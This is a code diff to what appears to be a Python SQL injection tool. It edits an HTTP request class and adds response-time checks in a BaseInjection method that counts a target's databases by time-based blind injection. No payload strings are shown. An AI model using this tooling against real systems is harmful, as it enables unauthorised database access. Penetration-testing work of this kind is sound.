@@ -22,11 +22,14 @@ class HTTPrequest():
         """ Send HTTP request and decompress response if gzip compressed. """
         self.payload = self._encode_url(payload)
         self.request = urllib.request.Request(self.payload, self.data, self.header)
+        self.response = None
         with urllib.request.urlopen(self.request) as response:
             self.response = response.read()
             # Check if gzip compressed.
             if self.response[0:2] == b'\x1f\x8b':
                 self.response = gzip.decompress(self.response)
+
+            return self.response
 
     def get_response(self):
         """ Return HTTP response. """
@@ -51,11 +54,10 @@ class HTTPrequest():
         self.query = self.payload_parts.query
         self.path_encoded = urllib.parse.quote(self.path)
         self.params_encoded = urllib.parse.quote(self.params)
-        self.query_encoded = urllib.parse.quote(self.query)
+        self.query_encoded = urllib.parse.quote(self.query, safe='&=,')
         self.payload_encoded = self.payload_parts._replace(path=self.path_encoded)
         self.payload_encoded = self.payload_parts._replace(params=self.params_encoded)
         self.payload_encoded = self.payload_parts._replace(query=self.query_encoded)
-        print(self.payload_encoded.geturl())
         return self.payload_encoded.geturl()
 
 ###### Injection base class ######
@@ -74,11 +76,12 @@ class BaseInjection(HTTPrequest):
     def get_database_num(self, query):
         for i in range(0, 50):
             self.payload = self.url + query
-            time_start = time.time()
-            self.send_request(self.payload.format(i))
-            time_finish = time.time()
-            total_time = time_finish - time_start
-            print(total_time)
+            self.time_start = time.time()
+            self.res = self.send_request(self.payload.format(i))
+            self.time_finish = time.time()
+            self.total_time = self.time_finish - self.time_start
+            if(self.total_time > 1):
+                print('Number of databases found = ',i , ', with a response time of ', self.total_time)
 
     def get_databases(self):
         pass
